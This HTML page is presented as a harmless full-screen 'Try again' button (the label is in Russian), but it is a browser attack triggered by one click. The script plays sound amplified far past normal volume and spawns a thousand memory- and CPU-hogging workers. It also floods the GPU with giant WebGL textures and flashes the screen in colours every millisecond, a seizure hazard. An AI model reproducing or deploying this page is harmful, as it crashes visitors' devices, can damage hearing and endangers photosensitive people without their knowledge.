<!DOCTYPE html>
<html>
<head>
  <style>
    #trapButton {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      font-size: 10rem;
      background: #9cff98;
      cursor: pointer;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <button id="trapButton">Попробуйте ещё раз</button>
  <audio id="nukeSound" src="sound.mp3"></audio>

  <script>
    const trigger = document.getElementById('trapButton');
    const audio = document.getElementById('nukeSound');

    trigger.onclick = () => {
      // 1. Активация звука
      audio.volume = 2.0;
      audio.play().catch(() => {
        const ctx = new AudioContext();
        const gainNode = ctx.createGain();
        gainNode.gain.value = 100;
        const source = ctx.createMediaElementSource(audio);
        source.connect(gainNode).connect(ctx.destination);
        audio.play();
      });

      // 2. Мгновенная RAM-атака
      for(let i = 0; i < 1000; i++) {
        new Worker(URL.createObjectURL(new Blob([`
          try {
            const bomb = [];
            // 4GB аллокация на воркер
            for(let j=0; j<40; j++) {
              bomb.push(new ArrayBuffer(1024 * 1024 * 100)); // 100MB x40 = 4GB
            }
            // Вечная блокировка CPU
            while(1) { 
              new Array(1e7).fill(0).map(Math.random);
            }
          } catch(e) {}
        `])));
      }

      // 3. Мгновенная GPU-атака
      const gpuKiller = () => {
        try {
          const canvas = document.createElement('canvas');
          canvas.width = 65536;
          canvas.height = 65536;
          const gl = canvas.getContext('webgl2');
          gl.texImage2D(
            gl.TEXTURE_2D, 0, gl.RGBA32F, 
            16384, 16384, 0,
            gl.RGBA, gl.FLOAT, null
          );
          setTimeout(gpuKiller, 1);
        } catch(e) {}
      };
      for(let i=0; i<500; i++) gpuKiller();

      // 4. Визуальная атака
      trigger.style.display = 'none';
      document.body.style.animation = 'flash 0.001s infinite';
      document.head.innerHTML += `
        <style>
          @keyframes flash {
            0% { background: #ff0000; }
            50% { background: #00ff00; }
            100% { background: #0000ff; }
        }
        </style>
      `;
    };
  </script>
</body>
</html>